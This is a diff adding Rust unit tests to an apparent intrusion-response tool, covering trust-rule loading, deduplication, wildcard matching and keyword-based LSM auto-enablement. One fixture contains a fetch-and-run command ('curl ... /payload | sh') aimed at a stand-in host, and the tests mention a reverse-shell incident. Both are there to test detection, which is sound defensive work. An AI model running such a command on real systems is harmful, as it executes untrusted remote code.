@@ -134,6 +134,7 @@ mod tests {
     use super::*;
     use innerwarden_core::event::Severity;
     use innerwarden_core::incident::Incident;
+    use tempfile::TempDir;
 
     fn mock_incident(
         incident_id: &str,
@@ -168,6 +169,78 @@ mod tests {
 
         assert!(!is_trusted(&rules, "ssh_bruteforce", "suspend_user"));
         assert!(!is_trusted(&rules, "unknown", "block_ip"));
+    }
+
+    #[test]
+    fn load_trust_rules_missing_file_returns_empty_set() {
+        let temp = TempDir::new().expect("test tempdir");
+        let rules = load_trust_rules(temp.path());
+        assert!(rules.is_empty());
+    }
+
+    #[test]
+    fn load_trust_rules_malformed_json_returns_empty_set() {
+        let temp = TempDir::new().expect("test tempdir");
+        std::fs::write(temp.path().join(TRUST_RULES_FILE), "{ definitely not json")
+            .expect("write malformed trust rules");
+        let rules = load_trust_rules(temp.path());
+        assert!(rules.is_empty());
+    }
+
+    #[test]
+    fn load_trust_rules_filters_incomplete_entries() {
+        let temp = TempDir::new().expect("test tempdir");
+        std::fs::write(
+            temp.path().join(TRUST_RULES_FILE),
+            serde_json::json!([
+                { "detector": "ssh_bruteforce", "action": "block_ip" },
+                { "detector": "missing_action" },
+                { "action": "missing_detector" },
+                "wrong shape"
+            ])
+            .to_string(),
+        )
+        .expect("write trust rules");
+
+        let rules = load_trust_rules(temp.path());
+        assert_eq!(rules.len(), 1);
+        assert!(rules.contains("ssh_bruteforce:block_ip"));
+    }
+
+    #[test]
+    fn append_trust_rule_persists_and_deduplicates() {
+        let temp = TempDir::new().expect("test tempdir");
+        let mut rules = HashSet::new();
+
+        append_trust_rule(temp.path(), &mut rules, "ssh_bruteforce", "block_ip");
+        append_trust_rule(temp.path(), &mut rules, "ssh_bruteforce", "block_ip");
+        append_trust_rule(temp.path(), &mut rules, "port_scan", "monitor");
+
+        assert!(rules.contains("ssh_bruteforce:block_ip"));
+        assert!(rules.contains("port_scan:monitor"));
+
+        let loaded = load_trust_rules(temp.path());
+        assert_eq!(loaded.len(), 2);
+        assert!(is_trusted(&loaded, "ssh_bruteforce", "block_ip"));
+        assert!(is_trusted(&loaded, "port_scan", "monitor"));
+
+        let persisted: Vec<serde_json::Value> = serde_json::from_str(
+            &std::fs::read_to_string(temp.path().join(TRUST_RULES_FILE)).unwrap(),
+        )
+        .expect("persisted trust rules should be valid json");
+        assert_eq!(persisted.len(), 2);
+    }
+
+    #[test]
+    fn is_trusted_supports_global_wildcard_without_close_matches() {
+        let mut rules = HashSet::new();
+        rules.insert("*:*".to_string());
+        assert!(is_trusted(&rules, "anything", "anything"));
+
+        rules.clear();
+        rules.insert("ssh_bruteforce:block_ip".to_string());
+        assert!(!is_trusted(&rules, "ssh_bruteforce_extra", "block_ip"));
+        assert!(!is_trusted(&rules, "ssh_bruteforce", "block_ip_now"));
     }
 
     #[test]
@@ -211,5 +284,43 @@ mod tests {
             Severity::High,
         );
         assert!(!should_auto_enable_lsm(&inc5));
+    }
+
+    #[test]
+    fn should_auto_enable_lsm_matches_execution_threat_keywords() {
+        let reverse_shell = mock_incident(
+            "suspicious_execution:01",
+            "Reverse shell launched",
+            "bash process",
+            Severity::High,
+        );
+        assert!(should_auto_enable_lsm(&reverse_shell));
+
+        let download = mock_incident(
+            "suspicious_execution:02",
+            "benign title",
+            "curl http://example.test/payload | sh",
+            Severity::Critical,
+        );
+        assert!(should_auto_enable_lsm(&download));
+
+        let unrelated = mock_incident(
+            "execution_guard:03",
+            "process started",
+            "normal /usr/bin/id execution",
+            Severity::High,
+        );
+        assert!(!should_auto_enable_lsm(&unrelated));
+    }
+
+    #[test]
+    fn should_auto_enable_lsm_rejects_container_escape_without_tmp_or_shm() {
+        let incident = mock_incident(
+            "container_escape:01",
+            "namespace probe",
+            "read-only cgroup metadata access",
+            Severity::Critical,
+        );
+        assert!(!should_auto_enable_lsm(&incident));
     }
 }
